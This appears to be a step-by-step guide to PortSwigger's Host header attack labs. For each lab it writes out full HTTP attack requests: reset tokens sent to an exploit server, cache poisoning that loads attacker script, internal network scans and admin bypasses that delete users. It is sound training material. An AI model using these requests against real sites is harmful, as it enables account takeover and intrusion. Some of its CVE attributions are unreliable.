# HTTP Host Header Attacks - PortSwigger Labs Complete Guide

This comprehensive guide covers all HTTP Host header attack labs from PortSwigger Web Security Academy, providing detailed exploitation techniques, step-by-step solutions, and real-world attack scenarios.

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [Basic Password Reset Poisoning](#lab-1-basic-password-reset-poisoning)
3. [Host Header Authentication Bypass](#lab-2-host-header-authentication-bypass)
4. [Web Cache Poisoning via Ambiguous Requests](#lab-3-web-cache-poisoning-via-ambiguous-requests)
5. [Routing-Based SSRF](#lab-4-routing-based-ssrf)
6. [SSRF via Flawed Request Parsing](#lab-5-ssrf-via-flawed-request-parsing)
7. [Host Validation Bypass via Connection State Attack](#lab-6-host-validation-bypass-via-connection-state-attack)
8. [Password Reset Poisoning via Dangling Markup](#lab-7-password-reset-poisoning-via-dangling-markup)

---

## Lab Overview

HTTP Host header attacks exploit the trust that web applications place in the Host header value. These vulnerabilities arise because:

- The Host header is mandatory in HTTP/1.1 and later
- Applications use it to construct absolute URLs, route requests, and identify domains
- Servers often implicitly trust the Host header without proper validation
- Multiple systems (load balancers, proxies, backends) may handle the header inconsistently

**Attack Categories:**
- Password reset poisoning
- Web cache poisoning
- Authentication bypass
- Routing-based SSRF
- Connection state exploitation
- Virtual host brute-forcing

---

## Lab 1: Basic Password Reset Poisoning

**Difficulty:** APPRENTICE
**Objective:** Exploit password reset functionality to gain access to Carlos's account

### Vulnerability Description

The application generates password reset links using the Host header value without validation. When a user requests a password reset, the application constructs an email containing a link with the token. By manipulating the Host header, an attacker can redirect the reset link to their own domain and capture the victim's reset token.

### Step-by-Step Solution

#### Phase 1: Reconnaissance

1. Navigate to the login page and click "Forgot password?"
2. Request a password reset for your account (wiener:peter)
3. Access the exploit server's email client
4. Examine the reset email structure - note the URL format:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=ABC123...
   ```

#### Phase 2: Test Host Header Manipulation

5. In Burp Suite, intercept the `POST /forgot-password` request
6. Send the request to Repeater
7. Modify the Host header to an arbitrary value:
   ```http
   POST /forgot-password HTTP/1.1
   Host: attacker-controlled-domain.com
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 21

   username=wiener
   ```
8. Send the request and check your email client
9. Verify that the reset URL now contains your arbitrary Host header value

#### Phase 3: Exploitation

10. Update the Host header to your exploit server domain:
    ```http
    POST /forgot-password HTTP/1.1
    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 21

    username=carlos
    ```

11. Send the poisoned request
12. Navigate to the exploit server and check the access logs
13. Look for a GET request containing Carlos's reset token:
    ```
    GET /forgot-password?temp-forgot-password-token=XYZ789... HTTP/1.1
    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
    ```

#### Phase 4: Account Takeover

14. Copy Carlos's reset token from the access log
15. Open your legitimate password reset email
16. Replace your token with Carlos's token in the URL:
    ```
    https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=XYZ789...
    ```
17. Set a new password for Carlos's account
18. Login as carlos with your newly set password
19. Lab solved!

### HTTP Requests/Responses

**Poisoned Request:**
```http
POST /forgot-password HTTP/1.1
Host: exploit-0a1b2c3d4e5f6g7h.exploit-server.net
Cookie: session=abc123...
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

username=carlos
```

**Response:**
```http
HTTP/1.1 302 Found
Location: /forgot-password
Set-Cookie: reset-requested=1
Content-Length: 0
```

**Captured Token in Access Log:**
```
10.0.3.45       2026-01-10 12:34:56 +0000 "GET /forgot-password?temp-forgot-password-token=abcdef123456... HTTP/1.1" 404 "User-Agent: Mozilla/5.0..."
```

### Key Exploitation Techniques

- **Host Header Injection**: Modifying the Host header to redirect application-generated URLs
- **Token Capture**: Using access logs on attacker-controlled servers to capture sensitive tokens
- **Account Takeover**: Using captured tokens to reset victim passwords

### Burp Suite Features Used

- **Repeater**: Test Host header modifications and observe responses
- **Proxy History**: Identify the password reset request
- **Exploit Server**: Capture tokens via access logs

### Common Mistakes

1. **Forgetting to change the username parameter** - Make sure to target `carlos`, not `wiener`
2. **Not checking access logs thoroughly** - Tokens appear in GET request parameters
3. **Copying the entire log line** - Extract only the token value
4. **Using the wrong reset URL structure** - Use the legitimate URL with the stolen token

### Troubleshooting

**Issue:** No request appears in access logs
**Solution:** Verify the Host header exactly matches your exploit server domain (no http:// prefix)

**Issue:** Token doesn't work
**Solution:** Ensure you're using the legitimate password reset URL structure from your own reset email

**Issue:** Lab doesn't solve after login
**Solution:** Verify you're logged in as `carlos`, not `wiener`

### Real-World Impact

Password reset poisoning affects major platforms and can lead to:
- Complete account takeover
- Access to sensitive user data
- Privilege escalation
- Mass account compromise in automated attacks

**Notable CVEs:**
- CVE-2022-29933: Craft CMS password reset poisoning via X-Forwarded-Host
- Multiple WordPress plugins vulnerable to similar attacks

### Prevention

- Validate Host header against a whitelist of permitted domains
- Use configuration-based domain values instead of Host header for generating URLs
- Implement signed/encrypted tokens that include domain binding
- Use relative URLs instead of absolute URLs where possible

---

## Lab 2: Host Header Authentication Bypass

**Difficulty:** APPRENTICE
**Objective:** Access the admin panel and delete user carlos

### Vulnerability Description

The application makes incorrect assumptions about user privilege levels based on the Host header value. The admin panel is restricted to "local users," but this check relies solely on the Host header being "localhost" rather than verifying the actual request origin. This allows attackers to bypass authentication by spoofing the Host header.

### Step-by-Step Solution

#### Phase 1: Discover Admin Interface

1. Navigate to `/robots.txt` on the target site
2. Identify the admin panel location:
   ```
   User-agent: *
   Disallow: /admin
   ```

#### Phase 2: Test Host Header Acceptance

3. Send a `GET /` request to Burp Repeater
4. Modify the Host header to an arbitrary value:
   ```http
   GET / HTTP/1.1
   Host: arbitrary-domain.com
   ```
5. Observe that the server still responds with 200 OK
6. This confirms the server accepts modified Host headers

#### Phase 3: Attempt Admin Access

7. Request the admin panel:
   ```http
   GET /admin HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   ```
8. Note the error message: "Admin interface only available to local users"

#### Phase 4: Bypass Authentication

9. Change the Host header to `localhost`:
   ```http
   GET /admin HTTP/1.1
   Host: localhost
   Cookie: session=your-session-cookie
   ```
10. Successfully access the admin panel
11. The response includes user deletion links

#### Phase 5: Delete User

12. Identify the deletion endpoint from the admin panel HTML:
    ```html
    <a href="/admin/delete?username=carlos">Delete</a>
    ```

13. Send the deletion request:
    ```http
    GET /admin/delete?username=carlos HTTP/1.1
    Host: localhost
    Cookie: session=your-session-cookie
    ```
14. Lab solved!

### HTTP Requests/Responses

**Failed Admin Access (Normal Host):**
```http
GET /admin HTTP/1.1
Host: 0a1b2c3d4e5f6g7h.web-security-academy.net
Cookie: session=abc123...

HTTP/1.1 401 Unauthorized
Content-Type: text/html
Content-Length: 2345

<h1>Admin interface only available to local users</h1>
```

**Successful Admin Access (Localhost Host):**
```http
GET /admin HTTP/1.1
Host: localhost
Cookie: session=abc123...

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 5678

<h1>Admin panel</h1>
<div>
    <span>carlos - </span>
    <a href="/admin/delete?username=carlos">Delete</a>
</div>
<div>
    <span>wiener - </span>
    <a href="/admin/delete?username=wiener">Delete</a>
</div>
```

**User Deletion Request:**
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Cookie: session=abc123...

HTTP/1.1 302 Found
Location: /admin
Content-Length: 0
```

### Key Exploitation Techniques

- **Host Header Spoofing**: Changing the Host header to match expected internal values
- **Access Control Bypass**: Exploiting flawed authorization checks based on Host header
- **Privilege Escalation**: Gaining admin access through header manipulation

### Burp Suite Features Used

- **Repeater**: Test different Host header values
- **Proxy**: Intercept and analyze admin panel responses
- **Target Site Map**: Discover admin endpoints via robots.txt

### Common Mistakes

1. **Using the wrong Host header value** - Must be exactly `localhost`, not `127.0.0.1` or other variations
2. **Forgetting session cookies** - Authentication still required, only authorization is bypassed
3. **Not reading robots.txt** - Admin location must be discovered first
4. **Incorrect deletion endpoint** - Must include `?username=carlos` parameter

### Troubleshooting

**Issue:** Admin panel still returns 401
**Solution:** Verify Host header is exactly `localhost` with no port number

**Issue:** Deletion request fails
**Solution:** Ensure you maintain the `Host: localhost` header in the deletion request

**Issue:** Session expires
**Solution:** Use a fresh session cookie from a recent legitimate request

### Real-World Impact

Host header authentication bypass vulnerabilities enable:
- Unauthorized admin panel access
- Privilege escalation without credentials
- Internal resource access from external networks
- Bypassing IP-based access controls

**Attack Scenarios:**
- Accessing internal admin interfaces exposed to the internet
- Bypassing WAF rules that check Host headers
- Gaining access to staging/development environments

### Prevention

- Never rely solely on Host header for access control decisions
- Validate requests against actual network origins (IP addresses, TLS certificates)
- Use proper authentication and authorization mechanisms
- Implement network segmentation to isolate admin interfaces
- Check actual request source IP addresses, not header values

---

## Lab 3: Web Cache Poisoning via Ambiguous Requests

**Difficulty:** PRACTITIONER
**Objective:** Poison the cache to execute alert(document.cookie) in the victim's browser

### Vulnerability Description

This lab demonstrates how discrepancies between cache and backend handling of ambiguous HTTP requests can lead to cache poisoning. The application validates the Host header but inconsistently processes requests containing multiple Host headers. The cache uses one Host header value for validation while the backend uses another for generating responses, allowing attackers to inject malicious content into cached responses.

### Step-by-Step Solution

#### Phase 1: Understand Caching Behavior

1. Send a baseline request with a cache buster:
   ```http
   GET /?cb=123 HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   ```

2. Examine response headers:
   ```http
   HTTP/1.1 200 OK
   X-Cache: miss
   Cache-Control: max-age=30
   Age: 0
   ```

3. Repeat the request and observe cache hit:
   ```http
   X-Cache: hit
   Age: 5
   ```

#### Phase 2: Test Host Header Injection

4. Add a second Host header with an arbitrary value:
   ```http
   GET /?cb=456 HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Host: arbitrary-domain.com
   ```

5. Examine the response body for script tags:
   ```html
   <script src="https://arbitrary-domain.com/resources/js/tracking.js"></script>
   ```

6. Confirm the second Host header is reflected in the absolute URL

#### Phase 3: Prepare Exploit

7. Access your exploit server
8. Create a malicious JavaScript file at `/resources/js/tracking.js`:
   ```javascript
   alert(document.cookie)
   ```

9. Store the exploit file on your server

#### Phase 4: Poison the Cache

10. Send the poisoning request with dual Host headers:
    ```http
    GET /?cb=789 HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
    ```

11. Verify the response contains your exploit server URL:
    ```html
    <script src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/resources/js/tracking.js"></script>
    ```

12. Check the cache status - if `X-Cache: miss`, repeat until you get a hit

#### Phase 5: Verify Exploitation

13. Once cached, access the page in your browser with the cache buster:
    ```
    https://YOUR-LAB-ID.web-security-academy.net/?cb=789
    ```

14. Confirm the alert executes with your cookies

#### Phase 6: Poison Main Page

15. Remove the cache buster and send the poisoning request:
    ```http
    GET / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
    ```

16. Repeat until the main page is cached with poisoned content
17. The victim will be served the poisoned cache
18. Lab solved!

### HTTP Requests/Responses

**Ambiguous Request (Dual Host Headers):**
```http
GET /?cb=123 HTTP/1.1
Host: 0a1b2c3d4e5f6g7h.web-security-academy.net
Host: exploit-0a9b8c7d6e5f4g3h.exploit-server.net
User-Agent: Mozilla/5.0...
Connection: close
```

**Poisoned Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html
X-Cache: miss
Cache-Control: max-age=30
Age: 0
Content-Length: 10234

<!DOCTYPE html>
<html>
<head>
    <script src="https://exploit-0a9b8c7d6e5f4g3h.exploit-server.net/resources/js/tracking.js"></script>
</head>
<body>
    ...
</body>
</html>
```

**Cached Response (Serving Poisoned Content):**
```http
HTTP/1.1 200 OK
Content-Type: text/html
X-Cache: hit
Age: 15
Content-Length: 10234

<!DOCTYPE html>
<html>
<head>
    <script src="https://exploit-0a9b8c7d6e5f4g3h.exploit-server.net/resources/js/tracking.js"></script>
</head>
<body>
    ...
</body>
</html>
```

### Key Exploitation Techniques

- **Ambiguous Request Crafting**: Sending multiple Host headers to exploit parsing discrepancies
- **Cache Poisoning**: Injecting malicious content into cached responses
- **Unkeyed Input Abuse**: Exploiting headers that affect responses but aren't part of cache keys
- **Script Injection**: Replacing legitimate JavaScript resources with malicious ones

### Burp Suite Features Used

- **Repeater**: Test and refine poisoning requests
- **Proxy HTTP History**: Monitor cache status headers
- **Response Analysis**: Identify reflection points for Host header values

### Common Mistakes

1. **Not using cache busters during testing** - Without them, you'll get stale cached responses
2. **Giving up too early on cache poisoning** - May need multiple attempts to cache poisoned response
3. **Incorrect exploit file path** - Must be at `/resources/js/tracking.js`
4. **Forgetting to remove cache buster** - Final attack must target the actual cached page
5. **Not checking X-Cache headers** - Essential for confirming cache status

### Troubleshooting

**Issue:** Second Host header not reflected
**Solution:** Ensure both Host headers are on separate lines, not comma-separated

**Issue:** Cache won't poison
**Solution:** Keep sending requests; caching is timing-dependent and may require multiple attempts

**Issue:** Alert doesn't execute
**Solution:** Verify the exploit file is properly formatted JavaScript, not HTML

**Issue:** Lab doesn't solve
**Solution:** Must poison the root path `/` without cache busters for the victim to trigger

### Real-World Impact

Web cache poisoning via Host header manipulation can cause:
- Mass exploitation affecting all users accessing cached content
- Persistent XSS attacks surviving page reloads
- Cookie theft from legitimate users
- Session hijacking at scale
- Malware distribution through trusted domains

**Notable Incidents:**
- Content Delivery Networks (CDNs) vulnerable to cache poisoning
- E-commerce sites serving malicious JavaScript to customers
- Banking applications leaking credentials through poisoned caches

### Prevention

- Include Host header in cache key calculations
- Validate all headers consistently across all infrastructure layers
- Reject requests with duplicate Host headers
- Implement strict parsing rules for ambiguous requests
- Use Content Security Policy (CSP) to restrict script sources
- Regularly purge and validate cached content

---

## Lab 4: Routing-Based SSRF

**Difficulty:** PRACTITIONER
**Objective:** Access the internal admin panel and delete user carlos

### Vulnerability Description

The application is vulnerable to routing-based SSRF via the Host header. Middleware components (load balancers, reverse proxies) route requests based on the Host header without proper validation. By manipulating the Host header to internal IP addresses, attackers can access internal systems that should be inaccessible from the external network.

### Step-by-Step Solution

#### Phase 1: Validate SSRF Capability

1. Send a baseline `GET /` request to Burp Repeater
2. Replace the Host header with a Burp Collaborator payload:
   ```http
   GET / HTTP/1.1
   Host: BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net
   ```

3. Send the request
4. Poll Burp Collaborator for interactions
5. Confirm that the server makes outbound HTTP requests based on Host header
6. This validates the SSRF vulnerability

#### Phase 2: Scan Internal Network

7. Configure Burp Intruder to scan the internal network
8. Position the payload in the Host header:
   ```http
   GET / HTTP/1.1
   Host: 192.168.0.§0§
   ```

9. Configure payload settings:
   - Payload type: Numbers
   - From: 0
   - To: 255
   - Step: 1

10. Start the attack
11. Analyze responses - look for different status codes or response lengths
12. Identify an IP that returns a `302` redirect to `/admin` (e.g., `192.168.0.187`)

#### Phase 3: Access Admin Panel

13. Send a request to the discovered admin IP:
    ```http
    GET /admin HTTP/1.1
    Host: 192.168.0.187
    ```

14. The response contains the admin panel HTML
15. Extract the CSRF token and session cookie from the response:
    ```html
    <form action="/admin/delete" method="POST">
        <input type="hidden" name="csrf" value="ABC123...">
        <input type="hidden" name="username" value="carlos">
        <button type="submit">Delete carlos</button>
    </form>
    ```

16. Note the `Set-Cookie` header in the response

#### Phase 4: Delete User

17. Construct the deletion request:
    ```http
    POST /admin/delete HTTP/1.1
    Host: 192.168.0.187
    Cookie: session=XYZ789...
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 38

    csrf=ABC123...&username=carlos
    ```

18. Send the request
19. Verify the response indicates successful deletion
20. Lab solved!

### HTTP Requests/Responses

**SSRF Validation (Collaborator):**
```http
GET / HTTP/1.1
Host: abc123xyz.burpcollaborator.net
User-Agent: Mozilla/5.0...

HTTP/1.1 504 Gateway Timeout
Content-Length: 0
```

**Collaborator Shows:**
```
DNS: abc123xyz.burpcollaborator.net
HTTP: GET / HTTP/1.1
```

**Network Scan (Intruder):**
```http
GET / HTTP/1.1
Host: 192.168.0.187

HTTP/1.1 302 Found
Location: /admin
Content-Length: 0
```

**Admin Panel Access:**
```http
GET /admin HTTP/1.1
Host: 192.168.0.187

HTTP/1.1 200 OK
Set-Cookie: session=abc123def456...
Content-Type: text/html
Content-Length: 3456

<html>
<body>
    <h1>Admin panel</h1>
    <form action="/admin/delete" method="POST">
        <input type="hidden" name="csrf" value="7h8i9j0k1l2m3n4o5p6q">
        <input type="hidden" name="username" value="carlos">
        <button>Delete carlos</button>
    </form>
</body>
</html>
```

**User Deletion:**
```http
POST /admin/delete HTTP/1.1
Host: 192.168.0.187
Cookie: session=abc123def456...
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

csrf=7h8i9j0k1l2m3n4o5p6q&username=carlos

HTTP/1.1 302 Found
Location: /admin
Content-Length: 0
```

### Key Exploitation Techniques

- **Routing-Based SSRF**: Exploiting request routing based on untrusted Host headers
- **Internal Network Scanning**: Using Intruder to discover internal IP addresses
- **CSRF Token Extraction**: Parsing HTML responses for anti-CSRF tokens
- **Session Management**: Maintaining cookies across internal requests

### Burp Suite Features Used

- **Collaborator**: Validate out-of-band SSRF capability
- **Intruder**: Automate internal network scanning
- **Repeater**: Test and refine exploitation requests
- **Proxy**: Analyze responses for CSRF tokens and session cookies

### Common Mistakes

1. **Not validating SSRF first** - Always confirm the vulnerability before scanning
2. **Incorrect Intruder payload position** - Must replace entire IP, not just last octet
3. **Forgetting CSRF tokens** - Deletion request will fail without valid token
4. **Missing session cookies** - Must extract and include cookies from admin panel response
5. **Using GET instead of POST** - Deletion typically requires POST method
6. **Not converting to POST** - Right-click > "Change request method" in Repeater

### Troubleshooting

**Issue:** No Collaborator interaction
**Solution:** Verify the Host header is properly formatted (no http:// prefix)

**Issue:** All IPs return same response
**Solution:** Look for subtle differences in response length, timing, or status codes

**Issue:** CSRF token invalid
**Solution:** Extract a fresh token from a recent admin panel request

**Issue:** Session expired
**Solution:** Use the session cookie from the same request that provided the CSRF token

### Real-World Impact

Routing-based SSRF via Host headers enables:
- Access to internal admin panels and APIs
- Cloud metadata service exploitation (AWS, Azure, GCP)
- Internal service enumeration and port scanning
- Bypassing network segmentation and firewalls
- Access to sensitive internal resources

**Notable CVEs:**
- CVE-2021-21972: VMware vCenter SSRF via Host header
- CVE-2019-5021: Capital One breach involved SSRF to AWS metadata
- Multiple load balancer and proxy implementations vulnerable

### Prevention

- Validate Host header against whitelist of permitted domains
- Disable or strictly control Host header-based routing
- Implement network segmentation with proper firewall rules
- Use authenticated internal APIs that don't trust Host headers
- Monitor for unexpected internal network connections
- Implement egress filtering to prevent outbound SSRF

---

## Lab 5: SSRF via Flawed Request Parsing

**Difficulty:** PRACTITIONER
**Objective:** Access the internal admin panel and delete user carlos

### Vulnerability Description

This lab demonstrates SSRF exploitation through flawed HTTP request parsing. The application validates the Host header when modified directly, but it processes absolute URLs in the request line differently. When an absolute URL is provided in the request line, the validation logic checks the URL instead of the Host header, creating a bypass opportunity. This allows attackers to specify one domain in the absolute URL (for validation) while targeting a different internal IP via the Host header (for routing).

### Step-by-Step Solution

#### Phase 1: Test Standard Host Header Modification

1. Send a `GET /` request to Burp Repeater
2. Modify the Host header to an arbitrary value:
   ```http
   GET / HTTP/1.1
   Host: arbitrary.com
   ```
3. Observe that the request is blocked or rejected
4. This indicates Host header validation is in place

#### Phase 2: Test Absolute URL Parsing

5. Modify the request to use an absolute URL in the request line:
   ```http
   GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
   Host: arbitrary.com
   ```
6. Observe that the request succeeds (200 OK)
7. This confirms the application validates the URL, not the Host header

#### Phase 3: Confirm SSRF Capability

8. Use Burp Collaborator to test outbound connections:
   ```http
   GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
   Host: BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net
   ```
9. Poll Collaborator for interactions
10. Confirm the server makes requests based on Host header value

#### Phase 4: Scan Internal Network

11. Send the request to Burp Intruder
12. **Important:** Disable "Update Host header to match target" in Intruder settings
13. Set up the payload position:
    ```http
    GET https://YOUR-LAB-ID.web-security-academy.net/ HTTP/1.1
    Host: 192.168.0.§0§
    ```
14. Configure payload:
    - Payload type: Numbers
    - From: 0
    - To: 255
    - Step: 1
15. Start the attack
16. Identify an IP that returns different response (e.g., 192.168.0.97 with admin panel)

#### Phase 5: Access Admin Panel

17. Request the admin interface:
    ```http
    GET https://YOUR-LAB-ID.web-security-academy.net/admin HTTP/1.1
    Host: 192.168.0.97
    ```
18. Extract the CSRF token from the response
19. Extract the session cookie from `Set-Cookie` header

#### Phase 6: Delete User

20. Build the deletion request:
    ```http
    GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=TOKEN&username=carlos HTTP/1.1
    Host: 192.168.0.97
    Cookie: session=COOKIE-VALUE
    ```
21. Right-click and select "Change request method" to convert to POST
22. The request becomes:
    ```http
    POST https://YOUR-LAB-ID.web-security-academy.net/admin/delete HTTP/1.1
    Host: 192.168.0.97
    Cookie: session=COOKIE-VALUE
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 45

    csrf=TOKEN&username=carlos
    ```
23. Send the request
24. Lab solved!

### HTTP Requests/Responses

**Standard Host Validation (Blocked):**
```http
GET / HTTP/1.1
Host: arbitrary-domain.com
User-Agent: Mozilla/5.0...

HTTP/1.1 403 Forbidden
Content-Type: text/html
Content-Length: 123

<h1>Invalid Host header</h1>
```

**Absolute URL Bypass:**
```http
GET https://0a1b2c3d4e5f6g7h.web-security-academy.net/ HTTP/1.1
Host: arbitrary-domain.com

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 5678

<!DOCTYPE html>
<html>
...
```

**Internal Network Scan:**
```http
GET https://0a1b2c3d4e5f6g7h.web-security-academy.net/ HTTP/1.1
Host: 192.168.0.97

HTTP/1.1 302 Found
Location: /admin
Content-Length: 0
```

**Admin Panel Access:**
```http
GET https://0a1b2c3d4e5f6g7h.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.97

HTTP/1.1 200 OK
Set-Cookie: session=xyz789abc123...
Content-Type: text/html

<html>
<head><title>Admin Panel</title></head>
<body>
    <form action="/admin/delete">
        <input name="csrf" value="qrstuvwxyz123456">
        <input name="username" value="carlos">
        <button>Delete</button>
    </form>
</body>
</html>
```

**User Deletion (POST):**
```http
POST https://0a1b2c3d4e5f6g7h.web-security-academy.net/admin/delete HTTP/1.1
Host: 192.168.0.97
Cookie: session=xyz789abc123...
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

csrf=qrstuvwxyz123456&username=carlos

HTTP/1.1 302 Found
Location: /admin
Content-Length: 0
```

### Key Exploitation Techniques

- **Absolute URL Exploitation**: Using complete URLs in request line to bypass validation
- **Request Parsing Discrepancy**: Exploiting differences between validation and routing logic
- **SSRF via URL Manipulation**: Combining URL and Host header to access internal resources
- **Method Conversion**: Converting GET to POST for proper form submission

### Burp Suite Features Used

- **Repeater**: Test absolute URL and Host header combinations
- **Collaborator**: Validate SSRF capability
- **Intruder**: Automate internal network discovery
  - **Critical Setting**: Disable "Update Host header to match target"
- **Context Menu**: Change request method from GET to POST

### Common Mistakes

1. **Forgetting to use absolute URLs** - Request line must include full URL, not just path
2. **Not disabling "Update Host header to match target"** - Intruder will override your payload
3. **Using relative paths** - Must maintain absolute URL format throughout exploitation
4. **Incorrect absolute URL syntax** - Must include `https://` protocol
5. **Not extracting session cookies** - CSRF token alone isn't sufficient
6. **Forgetting to convert to POST** - Many deletion endpoints require POST method

### Troubleshooting

**Issue:** Absolute URL requests still blocked
**Solution:** Verify the URL exactly matches your lab domain with proper protocol

**Issue:** Intruder keeps resetting Host header
**Solution:** Uncheck "Update Host header to match target" in Intruder target settings

**Issue:** Admin panel returns 401
**Solution:** Ensure you're including session cookies from the admin panel response

**Issue:** CSRF validation fails
**Solution:** Extract fresh token and cookie from same admin panel request

**Issue:** POST conversion doesn't work
**Solution:** Right-click in request editor, not in HTTP history

### Real-World Impact

Flawed request parsing enables:
- Bypassing Host header validation mechanisms
- Accessing internal admin panels and APIs
- Cloud metadata service exploitation
- Internal service discovery
- Privilege escalation through internal endpoints

**Attack Scenarios:**
- Bypassing WAF rules that only check Host headers
- Accessing internal services behind reverse proxies
- Exploiting microservices with inconsistent parsing
- Targeting internal APIs not designed for external access

### Prevention

- Validate both request line URL and Host header consistently
- Reject requests with absolute URLs that don't match Host header
- Implement uniform parsing logic across all infrastructure layers
- Use strict HTTP parsing with RFC compliance
- Monitor for requests with absolute URLs
- Implement network-level controls in addition to application validation

---

## Lab 6: Host Validation Bypass via Connection State Attack

**Difficulty:** EXPERT
**Objective:** Access the internal admin panel and delete user carlos

### Vulnerability Description

This lab demonstrates a sophisticated attack that exploits connection state assumptions in HTTP servers. The front-end server validates the Host header on the first request of a connection but then assumes all subsequent requests on the same persistent connection are equally valid. By sending a legitimate request first (establishing trust), followed by a malicious request with a spoofed Host header, attackers can bypass validation through connection reuse.

### Prerequisites

- **Burp Suite 2022.8.1 or later** (required for connection sequencing features)
- Understanding of HTTP persistent connections (`Connection: keep-alive`)

### Step-by-Step Solution

#### Phase 1: Test Individual Requests

1. Send a `GET /` request to Burp Repeater
2. Modify to target the admin panel directly:
   ```http
   GET /admin HTTP/1.1
   Host: 192.168.0.1
   ```
3. Send the request - observe it returns a redirect to the homepage
4. This shows individual requests with modified Host headers are rejected

#### Phase 2: Set Up Connection Sequencing

5. Right-click the tab in Repeater and select "Duplicate tab"
6. You now have two tabs with the same request
7. Select both tabs (Ctrl+Click or Cmd+Click)
8. Right-click and select "Create tab group"
9. Name the group (e.g., "Connection State Attack")

#### Phase 3: Configure First Request (Trust Establishment)

10. In the first tab, configure a legitimate request:
    ```http
    GET / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Connection: keep-alive
    ```
11. **Critical:** Ensure `Connection: keep-alive` header is present

#### Phase 4: Configure Second Request (Exploitation)

12. In the second tab, configure the admin access request:
    ```http
    GET /admin HTTP/1.1
    Host: 192.168.0.1
    Connection: keep-alive
    ```

#### Phase 5: Execute Connection State Attack

13. In the tab group, select the dropdown menu
14. Choose "Send group in sequence (single connection)"
15. Both requests will be sent over one TCP connection
16. Examine the second response - it should show the admin panel

#### Phase 6: Extract Admin Information

17. Analyze the admin panel response:
    ```html
    <form action="/admin/delete" method="POST">
        <input type="hidden" name="csrf" value="AbCdEfGhIj123456">
        <input type="hidden" name="username" value="carlos">
        <button type="submit">Delete</button>
    </form>
    ```
18. Extract the CSRF token value

#### Phase 7: Delete User

19. Modify the second tab to perform deletion:
    ```http
    POST /admin/delete HTTP/1.1
    Host: 192.168.0.1
    Cookie: session=YOUR-SESSION-COOKIE
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 46

    csrf=AbCdEfGhIj123456&username=carlos
    ```

20. Configure the first tab to remain legitimate:
    ```http
    GET / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Connection: keep-alive
    ```

21. Send the group in sequence (single connection) again
22. The second response should confirm successful deletion
23. Lab solved!

### HTTP Requests/Responses

**Individual Request (Failed):**
```http
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: close

HTTP/1.1 302 Found
Location: /
Content-Length: 0
```

**Connection State Attack - Request 1 (Legitimate):**
```http
GET / HTTP/1.1
Host: 0a1b2c3d4e5f6g7h.web-security-academy.net
Connection: keep-alive
User-Agent: Mozilla/5.0...

HTTP/1.1 200 OK
Connection: keep-alive
Content-Type: text/html
Content-Length: 5678

<!DOCTYPE html>
<html>
<body>
    <h1>Home Page</h1>
    ...
</body>
</html>
```

**Connection State Attack - Request 2 (Exploitation on Same Connection):**
```http
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive

HTTP/1.1 200 OK
Connection: keep-alive
Set-Cookie: session=xyz789...
Content-Type: text/html
Content-Length: 2345

<html>
<head><title>Admin Panel</title></head>
<body>
    <h1>Admin Panel - carlos</h1>
    <form action="/admin/delete" method="POST">
        <input type="hidden" name="csrf" value="K9L8M7N6O5P4Q3R2">
        <input type="hidden" name="username" value="carlos">
        <button>Delete user</button>
    </form>
</body>
</html>
```

**Deletion Sequence - Request 1 (Legitimate):**
```http
GET / HTTP/1.1
Host: 0a1b2c3d4e5f6g7h.web-security-academy.net
Connection: keep-alive

HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 5678
...
```

**Deletion Sequence - Request 2 (Delete User):**
```http
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: session=xyz789...
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

csrf=K9L8M7N6O5P4Q3R2&username=carlos

HTTP/1.1 302 Found
Location: /admin
Connection: keep-alive
Content-Length: 0
```

### Key Exploitation Techniques

- **Connection State Exploitation**: Leveraging persistent HTTP connections to bypass validation
- **Trust Inheritance**: Exploiting assumptions that all requests on a connection are equally valid
- **Sequential Request Manipulation**: Crafting request sequences to establish then abuse trust
- **Keep-Alive Abuse**: Using persistent connections to maintain state across requests

### Burp Suite Features Used

- **Repeater Tab Groups**: Organize related requests
- **Send Group in Sequence (Single Connection)**: Critical feature for connection state attacks
- **Connection Management**: Control over TCP connection reuse
- **Keep-Alive Headers**: Maintain persistent connections

### Common Mistakes

1. **Using Burp Suite older than 2022.8.1** - Earlier versions lack connection sequencing
2. **Forgetting `Connection: keep-alive`** - Without it, each request opens a new connection
3. **Sending requests individually** - Must use "Send group in sequence (single connection)"
4. **Wrong request order** - Legitimate request must come first
5. **Not grouping tabs** - Requests must be in a tab group for sequencing
6. **Closing connection too early** - Both requests must complete on same connection
